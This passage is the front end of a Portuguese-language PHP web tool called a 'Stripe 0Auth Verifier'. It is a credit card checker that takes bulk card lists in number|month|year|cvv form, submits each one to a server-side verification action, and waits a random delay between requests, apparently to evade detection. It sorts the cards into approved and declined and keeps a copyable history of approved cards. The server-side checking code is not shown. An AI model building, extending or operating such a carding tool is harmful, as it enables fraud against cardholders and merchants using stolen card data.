            font-family: 'JetBrains Mono', monospace;
            font-size: 0.85rem;
            line-height: 1.5;
        }

        .log-entry.verde { border-left-color: #00e676; }
        .log-entry.vermelho { border-left-color: #ff3d00; }
        .log-entry.azul { border-left-color: #2196F3; }
        .log-entry.laranja { border-left-color: #ff6b00; }

        .debug-footer {
            padding: 16px 28px;
            border-top: 1px solid #2a2a3a;
            text-align: right;
        }

        .btn-scroll {
            background: transparent;
            border: 1px solid #9c27b0;
            color: #9c27b0;
            padding: 8px 20px;
            border-radius: 30px;
            font-size: 0.9rem;
            cursor: pointer;
            transition: all 0.2s;
        }

        .btn-scroll:hover {
            background: #9c27b0;
            color: white;
        }

        .footer {
            grid-column: 1 / -1;
            text-align: center;
            margin-top: 40px;
            padding: 20px;
            color: #666;
            font-size: 0.9rem;
            border-top: 1px solid #2a2a3a;
        }

        /* Scrollbar */
        ::-webkit-scrollbar {
            width: 8px;
            height: 8px;
        }

        ::-webkit-scrollbar-track {
            background: #0a0a12;
        }

        ::-webkit-scrollbar-thumb {
            background: #2a2a3a;
            border-radius: 4px;
        }

        ::-webkit-scrollbar-thumb:hover {
            background: #ff6b00;
        }

        /* Loading */
        .loading {
            display: inline-block;
            width: 16px;
            height: 16px;
            border: 2px solid #9c27b0;
            border-radius: 50%;
            border-top-color: #ff6b00;
            animation: spin 1s linear infinite;
        }

        @keyframes spin {
            to { transform: rotate(360deg); }
        }

        /* Notificação */
        .notification {
            position: fixed;
            top: 20px;
            right: 20px;
            background: #1a1a26;
            border-left: 4px solid #ff6b00;
            border-radius: 12px;
            padding: 16px 24px;
            box-shadow: 0 8px 24px rgba(0,0,0,0.5);
            z-index: 1000;
            transform: translateX(400px);
            transition: transform 0.3s;
            max-width: 300px;
            border: 1px solid #2a2a3a;
        }

        .notification.show {
            transform: translateX(0);
        }

        .notification-title {
            font-weight: 600;
            color: #ff6b00;
            margin-bottom: 4px;
            font-size: 1rem;
        }

        .notification-message {
            color: #e0e0e0;
            font-size: 0.9rem;
        }

        /* Responsividade */
        @media (max-width: 1200px) {
            .container {
                grid-template-columns: 1fr;
            }
            
            body {
                padding: 20px;
            }
            
            .right-column {
                position: static;
                max-height: none;
            }
            
            .button-group {
                grid-template-columns: 1fr 1fr;
            }
        }

        @media (max-width: 600px) {
            .button-group {
                grid-template-columns: 1fr;
            }
            
            .stats-grid {
                grid-template-columns: 1fr;
            }
            
            .delay-slider {
                flex-direction: column;
            }
            
            .ambiente-info {
                flex-direction: column;
                align-items: flex-start;
            }
            
            .back-button-container {
                top: 10px;
                left: 10px;
            }
            .back-button {
                padding: 8px 15px;
                font-size: 0.8rem;
            }
            
            .container {
                margin-top: 50px;
            }
        }
    </style>
</head>
<body>
    <!-- Botão Voltar para o Dashboard -->
    <div class="back-button-container">
        <a href="/../dashboard.php" class="back-button">
            <span class="arrow">←</span>
            <span>VOLTAR AO DASHBOARD</span>
        </a>
    </div>

    <!-- Notificação -->
    <div id="notification" class="notification">
        <div class="notification-title" id="notificationTitle">ℹ️</div>
        <div class="notification-message" id="notificationMessage"></div>
    </div>

    <div class="container">
        <!-- Coluna Esquerda -->
        <div class="left-column">
            <div class="card">
                <div class="header">
                    <h1># Stripe 0Auth Verifier</h1>
                    <div class="subtitle">Sistema de verificação de cartões</div>
                </div>
                
                <div class="format-box">
                    <div class="label">📌 Formato:</div>
                    <code>número|mês|ano|cvv</code>
                    <div class="example">ex: 1234567890123456|12|2025|123</div>
                </div>
                
                <div class="input-group">
                    <label>💳 LISTA DE CARTÕES (1 por linha)</label>
                    <textarea id="cartoes" placeholder="4998180024092260|01|2029|352&#10;4532015112830366|12|2026|123"><?php echo isset($_POST['lista']) ? htmlspecialchars($_POST['lista']) : ''; ?></textarea>
                </div>
                
                <div class="file-upload" onclick="document.getElementById('fileInput').click()">
                    <input type="file" id="fileInput" accept=".txt">
                    <label>📁 Importar .txt</label>
                </div>

                <div class="delay-control">
                    <label>⏱️ DELAY: <span id="delayValueDisplay">7-12s</span></label>
                    <div class="delay-slider">
                        <input type="range" id="delayMin" min="3" max="20" value="7" step="1" oninput="updateDelay()">
                        <span class="delay-value" id="delayMinDisplay">7s</span>
                    </div>
                    <div class="delay-slider" style="margin-top: 10px;">
                        <input type="range" id="delayMax" min="3" max="20" value="12" step="1" oninput="updateDelay()">
                        <span class="delay-value" id="delayMaxDisplay">12s</span>
                    </div>
                </div>
                
                <div class="button-group">
                    <button class="btn btn-primary" onclick="processarLista()" id="btnProcessar">▶ PROCESSAR</button>
                    <button class="btn btn-danger" onclick="pararProcessamento()" id="btnParar" disabled>⏹ PARAR</button>
                    <button class="btn btn-secondary" onclick="limparTudo()">🧹 LIMPAR</button>
                    <button class="btn btn-secondary" onclick="limparDebug()">📝 LIMPAR LOG</button>
                </div>

                <div class="progress-bar">
                    <div class="progress-fill" id="progressBar" style="width: 0%;"></div>
                </div>

                <div class="status-message" id="statusMessage">
                    ⏳ Aguardando...
                </div>
                
                <div class="stats-grid">
                    <div class="stat-item total">
                        <div class="stat-value" id="totalStats"><?php echo $total_verificacoes; ?></div>
                        <div class="stat-label">TOTAL</div>
                    </div>
                    <div class="stat-item aprovados">
                        <div class="stat-value" id="aprovadosStats" style="color: #00e676;"><?php echo $aprovados; ?></div>
                        <div class="stat-label">APROVADOS</div>
                    </div>
                    <div class="stat-item reprovados">
                        <div class="stat-value" id="reprovadosStats" style="color: #ff3d00;"><?php echo $reprovados; ?></div>
                        <div class="stat-label">REPROVADOS</div>
                    </div>
                </div>

                <!-- Card de Ambiente SIMPLIFICADO -->
                <div class="ambiente-card" id="ambienteCard">
                    <div class="ambiente-header">
                        <h3>🖥️ AMBIENTE</h3>
                        <div class="loading" id="ambienteLoading" style="display: none;"></div>
                    </div>
                    <div class="ambiente-info">
                        <span class="ambiente-badge" id="ambienteTipo"><?php echo $ambiente_info['tipo']; ?></span>
                        <span class="ambiente-detalhe">PHP <span id="ambientePHP"><?php echo $ambiente_info['php']; ?></span></span>
                        <span class="ambiente-detalhe">• OS <span id="ambienteOS"><?php echo $ambiente_info['os']; ?></span></span>
                    </div>
                </div>
                
                <div class="historico-box">
                    <div class="historico-header">
                        <h3>📋 HISTÓRICO</h3>
                        <span id="historicoCount"><?php echo count($historico); ?></span>
                    </div>
                    <div class="historico-lista" id="historicoLista">
                        <?php foreach ($historico as $item): ?>
                        <div class="historico-item <?php echo $item['status']; ?>" onclick="copiarCartao('<?php echo $item['cartao']; ?>')">
                            <div class="historico-cartao"><?php echo $item['status'] === 'aprovado' ? '✅' : '❌'; ?> <?php echo $item['cartao']; ?></div>
                            <div class="historico-data"><?php echo $item['data']; ?></div>
                        </div>
                        <?php endforeach; ?>
                    </div>
                </div>
            </div>
        </div>
        
        <!-- Coluna Direita - Debug Panel SIMPLIFICADO -->
        <div class="right-column">
            <div class="debug-header">
                <h2>⚡ LOG DE EXECUÇÃO</h2>
                <div class="timestamp" id="timestamp"><?php echo date('d/m/Y H:i:s'); ?></div>
            </div>
            
            <div class="debug-log" id="debugLog">
                <div class="log-entry laranja">
                    ✅ Sistema pronto<br>
                    ⏱️ Delay: 7-12s
                </div>
            </div>
            
            <div class="debug-footer">
                <button class="btn-scroll" onclick="scrollToBottom()">
                    ⬇️ ROLAR
                </button>
            </div>
        </div>
        
        <div class="footer">
            Stripe OAuth • v5.0 • Protegido
        </div>
    </div>
    
    <script>
        // ========== VARIÁVEIS ==========
        let processando = false;
        let pararSolicitado = false;
        let cartoesPendentes = [];
        let cartoesProcessados = 0;
        let delayMin = 7;
        let delayMax = 12;
        
        // ========== FUNÇÕES ==========
        function updateDelay() {
            delayMin = parseInt(document.getElementById('delayMin').value);
            delayMax = parseInt(document.getElementById('delayMax').value);
            
            if (delayMin > delayMax) delayMax = delayMin;
            
            document.getElementById('delayMinDisplay').textContent = delayMin + 's';
            document.getElementById('delayMaxDisplay').textContent = delayMax + 's';
            document.getElementById('delayValueDisplay').textContent = delayMin + '-' + delayMax + 's';
        }
        
        function showNotification(titulo, mensagem, tipo = 'info') {
            const n = document.getElementById('notification');
            document.getElementById('notificationTitle').innerHTML = titulo;
            document.getElementById('notificationMessage').innerHTML = mensagem;
            n.style.borderLeftColor = tipo === 'sucesso' ? '#00e676' : tipo === 'erro' ? '#ff3d00' : '#ff6b00';
            n.classList.add('show');
            setTimeout(() => n.classList.remove('show'), 3000);
        }
        
        function updateTimestamp() {
            document.getElementById('timestamp').textContent = new Date().toLocaleString('pt-BR', {hour12: false});
        }
        setInterval(updateTimestamp, 1000);
        
        function scrollToBottom() {
            const log = document.getElementById('debugLog');
            log.scrollTo({top: log.scrollHeight, behavior: 'smooth'});
        }
        
        function addLog(mensagem, tipo = 'laranja') {
            const log = document.getElementById('debugLog');
            const entry = document.createElement('div');
            entry.className = `log-entry ${tipo}`;
            entry.innerHTML = mensagem;
            log.appendChild(entry);
            
            // Manter apenas últimas 15 mensagens
            while (log.children.length > 15) {
                log.removeChild(log.firstChild);
            }
            
            scrollToBottom();
        }
        
        function copiarCartao(cartao) {
            navigator.clipboard.writeText(cartao).then(() => {
                showNotification('✅ Copiado!', 'Cartão copiado para área de transferência', 'sucesso');
            });
        }
        
        function atualizarStats(stats) {
            document.getElementById('totalStats').textContent = stats.total;
            document.getElementById('aprovadosStats').textContent = stats.aprovados;
            document.getElementById('reprovadosStats').textContent = stats.reprovados;
        }
        
        function atualizarHistorico(historico) {
            const lista = document.getElementById('historicoLista');
            const count = document.getElementById('historicoCount');
            
            lista.innerHTML = '';
            count.textContent = historico.length;
            
            historico.forEach(item => {
                const div = document.createElement('div');
                div.className = `historico-item ${item.status}`;
                div.setAttribute('onclick', `copiarCartao('${item.cartao}')`);
                div.innerHTML = `
                    <div class="historico-cartao">${item.status === 'aprovado' ? '✅' : '❌'} ${item.cartao}</div>
                    <div class="historico-data">${item.data}</div>
                `;
                lista.appendChild(div);
            });
        }
        
        function atualizarProgresso() {
            if (cartoesPendentes.length > 0) {
                const total = cartoesProcessados + cartoesPendentes.length;
                const percent = (cartoesProcessados / total) * 100;
                document.getElementById('progressBar').style.width = percent + '%';
                document.getElementById('statusMessage').innerHTML = `⏳ ${cartoesProcessados}/${total}`;
            }
        }
        
        async function aguardarDelay() {
            const delay = Math.floor(Math.random() * (delayMax - delayMin + 1)) + delayMin;
            
            for (let i = delay; i > 0; i--) {
                if (pararSolicitado) return false;
                document.getElementById('statusMessage').innerHTML = `⏳ Aguardando ${i}s...`;
                await new Promise(r => setTimeout(r, 1000));
            }
            return true;
        }
        
        async function processarLista() {
            if (processando) return;
            
            const texto = document.getElementById('cartoes').value.trim();
            if (!texto) return showNotification('❌ Erro', 'Digite os cartões!', 'erro');
            
            cartoesPendentes = texto.split('\n').map(l => l.trim()).filter(l => l && l.includes('|'));
            if (cartoesPendentes.length === 0) return showNotification('❌ Erro', 'Nenhum cartão válido!', 'erro');
            
            processando = true;
            pararSolicitado = false;
            cartoesProcessados = 0;
            
            document.getElementById('btnProcessar').disabled = true;
            document.getElementById('btnParar').disabled = false;
            
            addLog(`🚀 Iniciando ${cartoesPendentes.length} cartões`, 'laranja');
            atualizarProgresso();
            
            while (cartoesPendentes.length > 0 && !pararSolicitado) {
                const cartao = cartoesPendentes.shift();
                cartoesProcessados++;
                
                document.getElementById('statusMessage').innerHTML = `⏳ ${cartao}`;
                
                try {
                    const formData = new FormData();
                    formData.append('ajax', '1');
                    formData.append('action', 'verificar');
                    formData.append('cartao', cartao);
                    
                    const response = await fetch(window.location.href, {method: 'POST', body: formData});
                    const data = await response.json();
                    
                    if (data.success) {
                        data.log.forEach(l => {
                            let tipo = l.includes('✅') ? 'verde' : l.includes('❌') ? 'vermelho' : 'azul';
                            addLog(l, tipo);
                        });
                        
                        atualizarStats(data.stats);
                        atualizarHistorico(data.historico);
                        
                        showNotification(
                            data.mensagem.includes('APROVADO') ? '✅ Aprovado' : '❌ Reprovado',
                            cartao,
                            data.mensagem.includes('APROVADO') ? 'sucesso' : 'erro'
                        );
                    }
                } catch (error) {
                    addLog('❌ Erro na requisição', 'vermelho');
                }
                
                atualizarProgresso();
                
                if (cartoesPendentes.length > 0 && !pararSolicitado) {
                    if (!await aguardarDelay()) break;
                }
            }
            
            if (pararSolicitado) {
                addLog('⏹️ Processamento interrompido', 'vermelho');
                document.getElementById('statusMessage').innerHTML = `⏹️ Parado (${cartoesProcessados} processados)`;
            } else {
                addLog('✅ Processamento concluído!', 'verde');
                document.getElementById('statusMessage').innerHTML = `✅ Concluído!`;
                document.getElementById('progressBar').style.width = '100%';
            }
            
            processando = false;
            document.getElementById('btnProcessar').disabled = false;
            document.getElementById('btnParar').disabled = true;
        }
        
        function pararProcessamento() {
            if (processando) {
                pararSolicitado = true;
                document.getElementById('btnParar').disabled = true;
            }
        }
        
        async function limparTudo() {
            if (processando) return showNotification('⚠️', 'Pare o processo primeiro!', 'aviso');
            if (!confirm('Limpar tudo?')) return;
            
            const formData = new FormData();
            formData.append('ajax', '1');
            formData.append('action', 'limpar');
            
            const response = await fetch(window.location.href, {method: 'POST', body: formData});
            const data = await response.json();
            
            if (data.success) {
                document.getElementById('totalStats').textContent = '0';
                document.getElementById('aprovadosStats').textContent = '0';
                document.getElementById('reprovadosStats').textContent = '0';
                document.getElementById('historicoLista').innerHTML = '';
                document.getElementById('historicoCount').textContent = '0';
                document.getElementById('cartoes').value = '';
                document.getElementById('progressBar').style.width = '0%';
                document.getElementById('statusMessage').innerHTML = '⏳ Aguardando...';
                addLog('🧹 Tudo limpo', 'laranja');
            }
        }
        
        function limparDebug() {
            document.getElementById('debugLog').innerHTML = '<div class="log-entry laranja">✅ Log limpo</div>';
        }
        
        // Importar arquivo
        document.getElementById('fileInput').addEventListener('change', function(e) {
            const file = e.target.files[0];
            if (!file) return;
            
            const reader = new FileReader();
            reader.onload = function(e) {
                document.getElementById('cartoes').value = e.target.result;
                showNotification('📁 Importado', file.name, 'sucesso');
            };
            reader.readAsText(file);
        });
        
        // Inicialização
        updateDelay();
        scrollToBottom();
    </script>
</body>
</html>